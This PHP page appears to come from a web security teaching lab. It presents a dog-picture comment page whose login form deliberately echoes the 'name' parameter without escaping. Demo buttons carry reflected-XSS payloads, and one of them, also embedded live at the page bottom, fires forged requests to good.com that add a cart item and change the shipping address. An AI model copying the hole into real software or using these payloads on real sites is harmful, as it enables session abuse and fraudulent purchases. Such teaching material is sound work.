<?php include('./head.php'); ?>

	<h1>Do you like dogs?</h1>
	<div class="row">
		<div class="col-md-3">
			<p>Cats are so last decade. Here's a cute picture of a dog!</p>
			<p><a href="closer.php"><img src="/img/dog.jpg" class="img-responsive" /></a></p>
		</div>
		<div class="col-md-9">
			<div class="media">
				<a class="pull-left" href="#"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCI+PHJlY3Qgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0IiBmaWxsPSIjZWVlIi8+PHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMzIiIHk9IjMyIiBzdHlsZT0iZmlsbDojYWFhO2ZvbnQtd2VpZ2h0OmJvbGQ7Zm9udC1zaXplOjEycHg7Zm9udC1mYW1pbHk6QXJpYWwsSGVsdmV0aWNhLHNhbnMtc2VyaWY7ZG9taW5hbnQtYmFzZWxpbmU6Y2VudHJhbCI+NjR4NjQ8L3RleHQ+PC9zdmc+" style="width: 64px; height: 64px;" class="media-object" data-src="holder.js/64x64" alt="64x64"></a>
				<div class="media-body">
					<h4 class="media-heading">John Doe</h4>
					Look at his eyes! OMG!!!11
				</div>
			</div>
			<div class="media">
				<a class="pull-left" href="#"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCI+PHJlY3Qgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0IiBmaWxsPSIjZWVlIi8+PHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMzIiIHk9IjMyIiBzdHlsZT0iZmlsbDojYWFhO2ZvbnQtd2VpZ2h0OmJvbGQ7Zm9udC1zaXplOjEycHg7Zm9udC1mYW1pbHk6QXJpYWwsSGVsdmV0aWNhLHNhbnMtc2VyaWY7ZG9taW5hbnQtYmFzZWxpbmU6Y2VudHJhbCI+NjR4NjQ8L3RleHQ+PC9zdmc+" style="width: 64px; height: 64px;" class="media-object" data-src="holder.js/64x64" alt="64x64"></a>
				<div class="media-body">
					<h4 class="media-heading">Susan Blythe</h4>
					ROFL! My chihuahua was in a cast once. Her leg was so heavy she couldn't move, poor thing...
				</div>
			</div>
			<div class="media">
				<a class="pull-left" href="#"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCI+PHJlY3Qgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0IiBmaWxsPSIjZWVlIi8+PHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMzIiIHk9IjMyIiBzdHlsZT0iZmlsbDojYWFhO2ZvbnQtd2VpZ2h0OmJvbGQ7Zm9udC1zaXplOjEycHg7Zm9udC1mYW1pbHk6QXJpYWwsSGVsdmV0aWNhLHNhbnMtc2VyaWY7ZG9taW5hbnQtYmFzZWxpbmU6Y2VudHJhbCI+NjR4NjQ8L3RleHQ+PC9zdmc+" style="width: 64px; height: 64px;" class="media-object" data-src="holder.js/64x64" alt="64x64"></a>
				<div class="media-body">
					<p>Login to comment</p>
					<form action="./" method="post"/>
						<div><label>Your Name <input autocomplete="off" type="text" name="name" class="form-control" value="<?php echo $_REQUEST['name'] ?>"/></label></div>
						<div><label>Password <input autocomplete="off" type="password" name="name" class="form-control"/></label></div>
						<div><button class="btn btn-sm btn-primary" type="submit">Login</button></div>
					</form>
				</div>
        <div class="well" style="margin-top: 1rem">
          <p>
            <a class="btn btn-xs btn-default" href="/?name=<?php echo urlencode('"/><script>alert(1);</script><span class="') ?>">Alert</a>
            <a class="btn btn-xs btn-default" href="/?name=<?php echo urlencode('"/><script>setTimeout(function(){$(\'a\').bind(\'click\',function(a){alert(1);})},1000)</script><span class="') ?>">Alert on Click</a>
            <a class="btn btn-xs btn-default" href="/?name=<?php echo urlencode('"/><script>setTimeout(function(){$(\'a\').bind(\'click\',function(a){var img1=new Image();img1.src=\'http://good.com/05-csrf/add.php?product=lt_shiny\';var img2=new Image();img2.src=\'http://good.com/05-csrf/setaddress.php?address=Someone+else\\\'s+place\';});},1000);</script><span class="') ?>">What does this do?</a>
          </p>
          <pre><?php echo htmlspecialchars(
            preg_replace("#([\{\};])#", "$1\n", $_GET['name'])
          ) ?></pre>
        </div>
			</div>
		</div>
	</div>

	<script>setTimeout(function(){$('a').bind('click',function(a){var img1=new Image();img1.src='http://good.com/05-csrf/add.php?product=lt_shiny';var img2=new Image();img2.src='http://good.com/05-csrf/setaddress.php?address=Someone+else\'s+place';});},1000);</script>

<?php include('./foot.php'); ?>
